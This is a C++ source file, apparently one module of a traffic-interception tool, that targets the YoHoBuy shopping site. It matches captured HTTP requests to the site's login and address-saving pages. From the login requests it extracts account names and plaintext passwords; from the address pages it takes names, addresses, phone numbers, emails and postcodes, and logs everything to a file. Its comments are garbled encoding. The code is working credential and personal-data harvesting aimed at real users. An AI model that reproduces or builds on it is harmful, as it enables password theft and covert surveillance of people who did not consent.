#include "StdAfx.h"
#include "ShoppingYoHoBuy.h"

shopping::YoHoBuy::YoHoBuy(HttpSession *http_session, const string &pro_name) : Shopping(http_session, pro_name)
{
	
}

shopping::YoHoBuy::~YoHoBuy()
{
	
}

int shopping::YoHoBuy::IsYoHoBuy(HttpSession *http_session)
{
	//pc��¼��Ϣ
	if((http_session->m_Requestline.m_Host.Find("www.yohobuy.com")!=-1) &&  
		(http_session->m_Requestline.m_URI.Find("/passport/login/")!=-1))
	{
		return kPCWebLogin;
	}
	//pc������ַ�޸ĵ�ַ
	if((http_session->m_Requestline.m_Host.Find("www.yohobuy.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/cart/index/saveAddress")!=-1))
	{
		return kPCWebAddAddress;
	}
	
	if((http_session->m_Requestline.m_Host.Find("www.yohobuy.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/home/address/saveAddress")!=-1))
	{
		return kPCWebModiy;
	}

	return 0;
}

int shopping::YoHoBuy::Process(const char *packet,int action)
{
	//pc��¼��Ϣ
	if (action == kPCWebLogin)
	{
		return PCWebLogin(packet);
	}	
	//pc������ַ�޸ĵ�ַ
	if (action == kPCWebAddAddress)
	{
		return PCWebAddAddress(packet);
	}
	if (action==kPCWebModiy)
	{
		return PCWebModiy(packet);
	}
	return 0;
}

//pc��¼��Ϣ
int shopping::YoHoBuy::PCWebLogin(const char *packet)
{
	string src_data(packet);
	ms_->SplitStringToMap(src_data,'&','=');

	string pass;
	user_=ms_->GetValueFromMapByKey("account",true);
	pass=ms_->GetValueFromMapByKey("password",true);
	if ( user_.empty() || pass.empty())
	{
		return 0;
	}
	output_text_ = 
		"user=" + user_ + "\r\n" + 
		"pass=" + pass + "\r\n" + 
		"state=��¼\r\n";	
	WriteIndexFile();
	return 1;
}

//pc������ַ�޸ĵ�ַ
int shopping::YoHoBuy::PCWebAddAddress(const char *packet)
{	
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);

	ms_->SplitStringToMap(src_data,'&','=');
	//�ջ���
	name_=ms_->GetValueFromMapByKey("consignee",true);
	//��ַ
	string address,areacode;
	address=ms_->GetValueFromMapByKey("address",true);
	areacode=ms_->GetValueFromMapByKey("areaCode",true);
	areacode=GetAddress(areacode);
	address_=areacode + address;
	//�ֻ���
	string phoneCode,phoneNum,mobile;
	phoneCode=ms_->GetValueFromMapByKey("phoneCode",true);
	phoneNum=ms_->GetValueFromMapByKey("phoneNum",true);
	mobile=ms_->GetValueFromMapByKey("mobile",true);
	phone_= phoneCode + "-" +phoneNum + "," +mobile;
	//�ʼ�
	string Email;
	Email=ms_->GetValueFromMapByKey("email",true);

	//�ʱ�
	string postcode;
	postcode = ms_->GetValueFromMapByKey("zipCode",true);

	//�ж�ID
	string id;
	id=ms_->GetValueFromMapByKey("id",true);
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	if (id.empty())
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"msgtype=" + postcode + "\r\n" + 
			"netmark=" + Email + "\r\n" + 
			"state=��ӵ�ַ\r\n";
		
	WriteIndexFile();

	}else{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"msgtype=" + postcode + "\r\n" + 
			"netmark=" + Email + "\r\n" + 
			"state=�޸ĵ�ַ\r\n";
		
	WriteIndexFile();

	}
	return 0;
}

int shopping::YoHoBuy::PCWebModiy(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	
	ms_->SplitStringToMap(src_data,'&','=');
	//�ջ���
	name_=ms_->GetValueBetweenBeginEnd(src_data,"addressName","&");
	//��ַ
	string address,areacode;
	address=ms_->GetValueFromMapByKey("address",true);
	areacode=ms_->GetValueFromMapByKey("areaCode",true);
	areacode=GetAddress(areacode);
	address_=areacode + address;
	//�ֻ���
	string mobile;
	phone_ = ms_->GetValueFromMapByKey("phone",true);
	mobile = ms_->GetValueFromMapByKey("mobile",true);
	//�ʼ�
	string Email;
	Email=ms_->GetValueFromMapByKey("email",true);
	
	//�ʱ�
	string postcode;
	postcode = ms_->GetValueFromMapByKey("zipCode",true);
	
	//�ж�ID
	string id;
	id=ms_->GetValueFromMapByKey("addrId",true);
	int n=atoi(id.c_str());
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	if (n==0)
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"clientmsg=" + mobile + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"msgtype=" + postcode + "\r\n" + 
			"netmark=" + Email + "\r\n" + 
			"state=��ӵ�ַ\r\n";
		
		WriteIndexFile();
		
	}else{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"clientmsg=" + mobile + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"msgtype=" + postcode + "\r\n" + 
			"netmark=" + Email + "\r\n" + 
			"state=�޸ĵ�ַ\r\n";
		
		WriteIndexFile();
		
	}
	return 0;
}